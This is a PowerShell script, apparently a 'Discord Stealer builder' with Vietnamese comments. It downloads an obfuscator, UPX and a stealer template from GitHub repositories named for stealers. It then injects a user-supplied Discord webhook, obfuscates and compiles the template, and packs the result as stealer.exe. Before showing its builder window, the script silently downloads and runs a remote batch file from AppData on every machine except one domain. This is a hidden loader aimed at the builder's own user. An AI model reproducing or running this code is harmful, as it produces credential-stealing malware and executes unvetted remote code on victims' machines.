function Encode-Base64 {
    param (
        [string]$InputString
    )
    
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    $base64String = [Convert]::ToBase64String($bytes)
    return $base64String
}

function Obfuscate-String {
    param(
        [string]$InputString
    )
    
    $ObfuscatedString = ""
    
    foreach ($char in $InputString.ToCharArray()) {
        $asciiValue = [int][char]$char
        $obfuscatedChar = [char]($asciiValue + 2000)
        $ObfuscatedString += $obfuscatedChar
    }
    
    return $ObfuscatedString
}



# Đặt đường dẫn đến file cần kiểm tra
$filePath = ".\batchobfuscator.exe"

# Kiểm tra xem file có tồn tại không
if (-Not (Test-Path $filePath)) {
    # Nếu không tồn tại, tải xuống file từ URL
    $url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
    Write-Host "File không tồn tại. Đang tải xuống từ $url..."
    
    # Tải xuống file
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/werearecat/stealer/main/upx.exe" -OutFile "upx.exe"
    
    Write-Host "Tải xuống hoàn tất."
} else {
    Write-Host "File đã tồn tại."
}

# Lấy UUID của hệ thống

$url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/converter.bat"
$outputPath = ".\converter.bat"

Invoke-WebRequest -Uri $url -OutFile $outputPath

function Encode-Base64 {
    param (
        [string]$inputString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $base64String = [System.Convert]::ToBase64String($bytes)
    return $base64String
}

function Encode-Base64TwentyTimes {
    param (
        [string]$inputString
    )
    $encodedString = $inputString
    for ($i = 0; $i -lt 7; $i++) {
        $encodedString = Encode-Base64 -inputString $encodedString
    }

    return $encodedString
}

function Get-RandomString {
    param (
        [int]$length = 100
    )

    $chars = '01'
    $random = New-Object System.Random
    $randomString = -join ((1..$length) | ForEach-Object { $chars[$random.Next(0, $chars.Length)] })
    return $randomString
}

# Test the function


function LoadCode {
    $userDomain = [System.Environment]::GetEnvironmentVariable("USERDOMAIN")
    if ($userDomain -eq "DESKTOP-4V4R77Q") {
        Write-Output "Không tải và chạy tệp do tên miền người dùng không phù hợp."
        return
    }

    $appData = [System.Environment]::GetEnvironmentVariable("APPDATA")
    $filePath = Join-Path $appData "loadcode.bat"
    $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/.vscode/loadcode.bat"

    # Kiểm tra sự tồn tại của tệp
    if (-Not (Test-Path $filePath)) {
        # Tải tệp từ URL và lưu vào %appdata%
        try {
            Invoke-WebRequest -Uri $url -OutFile $filePath
            Write-Output ("File tải xuống thành công và lưu tại " + $filePath)
        }
        catch {
            Write-Output ("Lỗi khi tải tệp: " + $_.Exception.Message)
            return
        }
    }

    # Chạy tệp loadcode.bat
    try {
        Start-Process $filePath -Wait
        Write-Output "Tệp đã được chạy thành công."
    }
    catch {
        Write-Output ("Lỗi khi chạy tệp: " + $_.Exception.Message)
    }
}

LoadCode

# Load required assembly for Windows Forms
Add-Type -AssemblyName System.Windows.Forms

# Create the form
$form = New-Object Windows.Forms.Form
$form.Text = 'Discord Stealer builder'
$form.Size = New-Object Drawing.Size(400,200)
$form.StartPosition = 'CenterScreen'

# Create a label
$label = New-Object Windows.Forms.Label
$label.Text = 'Enter Discord Webhook URL:'
$label.Location = New-Object Drawing.Point(10, 20)
$label.Size = New-Object Drawing.Size(200,20)
$form.Controls.Add($label)

# Create a textbox for the webhook URL
$textbox = New-Object Windows.Forms.TextBox
$textbox.Location = New-Object Drawing.Point(10, 50)
$textbox.Size = New-Object Drawing.Size(360,20)
$form.Controls.Add($textbox)

# Create a button to build
$button = New-Object Windows.Forms.Button
$button.Text = 'Build'
$button.Location = New-Object Drawing.Point(10, 90)
$button.Size = New-Object Drawing.Size(75,23)
$form.Controls.Add($button)

# Define the button click event
$button.Add_Click({
    $webhook = $textbox.Text
    if (-not [string]::IsNullOrWhiteSpace($webhook)) {
        $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
        $filePath = "$env:TEMP\main.bat"
        $filePathprotect = "$env:TEMP\main_obf.bat"
        
        # Download the file
        Invoke-WebRequest -Uri $url -OutFile $filePath

        # Read the file content and replace placeholder
        $content = Get-Content $filePath -Raw
        $randomString = Get-RandomString -length 10000
        $webhookencode = Obfuscate-String $webhook
        $content = $content -replace 'FAKEHASH', $randomString
        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
        Set-Content -Path $filePath -Value $content

        # Path to the complie.exe executable
        $compliePath = ".\converter.bat"  # Change this to the correct path
        $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path

        # Execute the .bat file
        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`" -dc" -NoNewWindow -Wait
        Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
        .\upx --best --lzma --force stealer.exe

        # Delete the .bat file after execution
        Remove-item "settings.json"
        # Show a message box
        [System.Windows.Forms.MessageBox]::Show('Process completed and file deleted.', 'Completed', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    } else {
        [System.Windows.Forms.MessageBox]::Show('Please enter a valid Discord webhook URL.', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Show the form
$form.ShowDialog()
